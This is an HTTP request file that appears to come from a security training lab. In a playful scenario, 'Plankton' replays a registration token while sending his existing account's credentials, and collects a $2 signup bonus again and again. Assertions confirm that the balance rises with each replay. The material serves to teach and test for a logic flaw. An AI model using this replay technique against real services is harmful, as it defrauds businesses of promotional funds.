# @import ../common/setup.http
@host = {{base_host}}/v107
@mailpit = http://127.0.0.1:8025/api/v1

# Sandy adds a $2 signup bonus to new users, and Plankton wants to exploit it!


### Plankton registers to get the $2 signup bonus
POST /auth/register
Content-Type: application/json

{ "email": "plankton.jr@chum-bucket.sea" }

?? status == 200


###
GET {{mailpit}}/messages?limit=1

@message_id = {{response.parsedBody.messages.at(-1).ID}}


###
GET {{mailpit}}/message/{{message_id}}

@token = {{response.parsedBody.Text.match(/token=([a-zA-Z0-9\-_.]+)/)[1]}}


### He completes registration and gets $2 into his new account
POST /auth/register
Content-Type: application/json

{
    "token": "{{token}}",
    "password": "i_love_my_wife",
    "name": "Plankton Jr."
}

?? status == 200
?? js response.parsedBody.email == plankton.jr@chum-bucket.sea


# -- Exploit: Plankton can replay registration request, collecting unlimited bonuses into his REAL account --

### Plankton starts with $50 in his real account
# @name initial_balance
GET /account/info
Authorization: {{plankton_auth_email}}

?? status == 200


### Plankton replays registration request, but adds his real credentials to the request
POST /auth/register
Authorization: {{plankton_auth_email}}
Content-Type: application/json

{
    "token": "{{token}}",
    "password": "i_love_my_wife",
    "name": "Plankton"
}

?? status == 200
// The request says "user_created", but lists Plankton's EXISTING email, not the new one!
?? js response.parsedBody.status == user_created
?? js response.parsedBody.email == plankton@chum-bucket.sea


### Now Plankton has more money: if he continues to replay the registration request, he will receive additional bonuses!
GET /account/info
Authorization: {{plankton_auth_email}}

?? status == 200
?? js parseFloat(response.parsedBody.balance) == {{parseFloat(initial_balance.balance) + 2.00}}
